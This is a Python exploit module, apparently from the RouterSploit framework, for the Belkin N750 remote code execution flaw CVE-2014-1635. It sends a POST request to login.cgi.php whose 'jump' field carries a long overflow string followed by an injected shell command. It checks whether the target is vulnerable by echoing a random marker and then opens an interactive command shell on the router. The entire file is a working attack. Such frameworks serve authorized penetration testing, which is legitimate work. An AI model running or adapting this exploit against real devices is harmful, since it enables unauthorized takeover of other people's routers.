from routersploit import (
    exploits,
    print_success,
    print_status,
    print_error,
    random_text,
    http_request,
    mute,
    validators,
    shell
)


class Exploit(exploits.Exploit):
    """
    Exploit implementation for Belkin N750 Remote Code Execution vulnerability.
    If the target is vulnerable, command prompt is invoked.
    """
    __info__ = {
        'name': 'Belkin N750 RCE',
        'description': 'Module exploits Belkin N750 Remote Code Execution vulnerability which allows executing commands on operation system level.',
        'authors': [
            'Marco Vaz <mv[at]integrity.pt>',  # vulnerability discovery
            'Marcin Bury <marcin.bury[at]reverse-shell.com>',  # routersploit module
        ],
        'references': [
            'http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-1635',
            'https://www.exploit-db.com/exploits/35184/',
            'https://labs.integrity.pt/articles/from-0-day-to-exploit-buffer-overflow-in-belkin-n750-cve-2014-1635/',
        ],
        'devices': [
            'Belkin N750',
        ]
    }

    target = exploits.Option('', 'Target address e.g. http://192.168.1.1', validators=validators.url)
    port = exploits.Option(80, 'Target Port')

    def run(self):
        if self.check():
            print_success("Target is vulnerable")
            print_status("Invoking command loop...")
            shell(self, architecture="mipsbe")
        else:
            print_error("Target is not vulnerable")

    def execute(self, cmd):
        url = "{}:{}/login.cgi.php".format(self.target, self.port)
        headers = {u'Content-Type': u'application/x-www-form-urlencoded'}
        data = "GO=&jump=" + "A" * 1379 + ";{};&ps=\n\n".format(cmd)

        response = http_request(method="POST", url=url, headers=headers, data=data)
        if response is None:
            return ""

        return response.text

    @mute
    def check(self):
        mark = random_text(32)
        cmd = "echo {}".format(mark)

        response = self.execute(cmd)

        if mark in response:
            return True  # target is vulnerable

        return False  # target is not vulnerable
